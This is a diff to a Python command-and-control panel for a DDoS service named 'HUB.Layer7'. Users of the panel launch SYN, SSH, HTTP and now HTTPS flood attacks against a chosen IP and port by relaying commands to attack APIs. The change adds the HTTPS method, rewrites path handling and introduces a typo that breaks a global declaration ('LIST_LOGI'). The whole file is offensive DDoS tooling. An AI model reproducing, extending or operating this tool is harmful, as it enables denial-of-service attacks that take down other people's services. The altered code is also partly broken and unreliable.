@@ -3,6 +3,7 @@ import socket
 import time
 import threading
 import requests
+import sys
 from colored import fg,attr
 
 PORT_SERVER = 0
@@ -94,15 +95,15 @@ banner_help = f'''
 banner_layer7 = f'''
 {fg(196)}                                         _.oo.
 {fg(197)}                 _.u[[/;:,.         .odMMMMMM' 
-{fg(198)}              .o888UU[[[/;:-.  .o@P^    MMM^                                                        |
-{fg(199)}             oN88888UU[[[/;::-.        dP^                                                         / \\
-{fg(200)}            dNMMNN888UU[[[/;:--.   .o@P^   ╔═════════════════════════════════════════════╗        / _ \\
-{fg(201)}           ,MMMMMMN888UU[[/;::-. o@^       ║  ━ ═ ━ ═ ━ WELCOME TO HUB.Layer7 ━ ═ ━ ═ ━  ║       |.o '.|
-{fg(207)}           NNMMMNN888UU[[[/~.o@P^          ╚═════════════════════════════════════════════╝       |'._.'|
-{fg(206)}           888888888UU[[[/o@^-..             ╔════════╗ ╔════════╗ ╔════════╗ ╔════════╗         |     |
-{fg(205)}          oI8888UU[[[/o@P^:--..              ║  HTTP  ║ ║   SSH  ║ ║ XXXXXX ║ ║ XXXXXX ║       ,'|  |  |`.
-{fg(204)}       .@^  YUU[[[/o@^;::---..               ╚════════╝ ╚════════╝ ╚════════╝ ╚════════╝      /  |  |  |  \\
-{fg(203)}     oMP     ^/o@P^;:::---..               ╔═════════════════════════════════════════════╗    |,-'--|--'-.|
+{fg(198)}              .o888UU[[[/;:-.  .o@P^    MMM^                                                         |
+{fg(199)}             oN88888UU[[[/;::-.        dP^                                                          / \\
+{fg(200)}            dNMMNN888UU[[[/;:--.   .o@P^   ╔═════════════════════════════════════════════╗         / _ \\
+{fg(201)}           ,MMMMMMN888UU[[/;::-. o@^       ║  ━ ═ ━ ═ ━ WELCOME TO HUB.Layer7 ━ ═ ━ ═ ━  ║        |.o '.|
+{fg(207)}           NNMMMNN888UU[[[/~.o@P^          ╚═════════════════════════════════════════════╝        |'._.'|
+{fg(206)}           888888888UU[[[/o@^-..            ╔════════╗ ╔════════╗  ╔═════════╗ ╔════════╗         |     |
+{fg(205)}          oI8888UU[[[/o@P^:--..             ║  HTTP  ║ ║   SSH  ║  ║  HTTPS  ║ ║ XXXXXX ║       ,'|  |  |`.
+{fg(204)}       .@^  YUU[[[/o@^;::---..              ╚════════╝ ╚════════╝  ╚═════════╝ ╚════════╝      /  |  |  |  \\
+{fg(203)}     oMP     ^/o@P^;:::---..               ╔═════════════════════════════════════════════╗     |,-'--|--'-.|
 {fg(202)}  .dMMM    .o@^ ^;::---...                 ║ ━ ═ ━ ═ ━ MADE BY IDKHEX1629#3051 ━ ═ ━ ═ ━ ║ 
 {fg(208)} dMMMMMMM@^`       `^^^^                   ╚═════════════════════════════════════════════╝
 {fg(209)}YMMMUP^
@@ -146,18 +147,25 @@ class CHECKING:
     def CONFIG_CNC():
         global KEY_ACCESS,LIST_LOGIN
         while True:
-            PATH = f'{os.path.join(os.path.dirname(__file__))}/assets/config.txt'
+            set = ''
+            data = os.path.abspath(sys.argv[0])
+            directory = os.path.dirname(data)
+            if '\\' in data:
+               set = '\\'
+            else:
+               set = '/'
+            PATH = f'{directory}{set}assets{set}config.txt'
             COMMAND = LOAD_FILES.READ_FILES(PATH, 'r', 2)
             for command in COMMAND:
                 code_got = command.replace('\n', '')
                 code = code_got.split('=')
                 time.sleep(0.5)
                 if code[0] == 'DB_LOAD':
-                    if f'{os.path.join(os.path.dirname(__file__))}/assets/users_login/{code[1]}' != CHECKING.DB_LOADING:
-                        CHECKING.DB_LOADING = f'{os.path.join(os.path.dirname(__file__))}/assets/users_login/{code[1]}'
+                    if f'{directory}{set}assets{set}users_login{set}{code[1]}' != CHECKING.DB_LOADING:
+                        CHECKING.DB_LOADING = f'{directory}{set}assets{set}users_login{set}{code[1]}'
                 elif code[0] == 'API_LOAD':
-                    if f'{os.path.join(os.path.dirname(__file__))}/assets/api/{code[1]}' != CHECKING.API_LOADING:
-                        CHECKING.API_LOADING = f'{os.path.join(os.path.dirname(__file__))}/assets/api/{code[1]}'
+                    if f'{directory}{set}assets{set}api{set}{code[1]}' != CHECKING.API_LOADING:
+                        CHECKING.API_LOADING = f'{directory}{set}assets{set}api{set}{code[1]}'
                 elif code[0] == 'REMOVE_USERPASS':
                     if code[1] != CHECKING.REMOVE_USERPASS:
                         CHECKING.REMOVE_USERPASS = code[1]
@@ -168,7 +176,7 @@ class CHECKING:
 
     @staticmethod
     def DB_GOT():
-        global LIST_LOGIN
+        global LIST_LOGI
         code_user = len(LIST_LOGIN)
         while True:
             COMMAND = LOAD_FILES.READ_FILES(CHECKING.DB_LOADING, 'r', 2)
@@ -225,9 +233,9 @@ class CHECKING:
                         CHECKING.API_ONLINE.append(LINKS)
                         CHECKING.count_api += 1
                     else:
-                       pass
+                       print(LINKS)
                 except:
-                    pass
+                    print(LINKS)
                 time.sleep(CHECKING.SPEED)
             else:
                 CHECKING.URL_REUTRN_FAILED = True
@@ -258,7 +266,7 @@ class LOAD_FILES:
                     data = f.readline()
                 elif type == 2:
                     data = f.readlines()
-        except:
+        except Exception as e:
             data = 'FAILED'
         return data
 
@@ -396,7 +404,7 @@ class CLIENT_BUILDER():
                    CLIENT_BUILDER.SEND(socks,f'{fg(196)}UNREGISTER {fg(197)}<USER> {fg(198)}<PASSWORD>')
              elif COM == 'ATTACKS':
                 if len(command) == 6:
-                 methods = ["SYN","SSH","HTTP"] 
+                 methods = ["SYN","SSH","HTTP",'HTTPS'] 
                  code = 0
                  ip_tar = command[1]
                  port = command[2]
@@ -422,7 +430,7 @@ class CLIENT_BUILDER():
                  else:
                     CLIENT_BUILDER.SEND(socks,f'{fg(196)}METHODS NOT FOUND')
                 else:
-                   CLIENT_BUILDER.SEND(socks, f"{fg(196)}ATTACKS <IP> <PORT> <TIME> <SPAM_API> <METHODS>\r\n{fg(197)}METHODS CHOOSE HTTP or SYN SSH")
+                   CLIENT_BUILDER.SEND(socks, f"{fg(196)}ATTACKS <IP> <PORT> <TIME> <SPAM_API> <METHODS>\r\n{fg(197)}METHODS CHOOSE SSH HTTP HTTPS or SYN")
              CLIENT_BUILDER.SEND(socks, prompt, False)
         except:
            pass
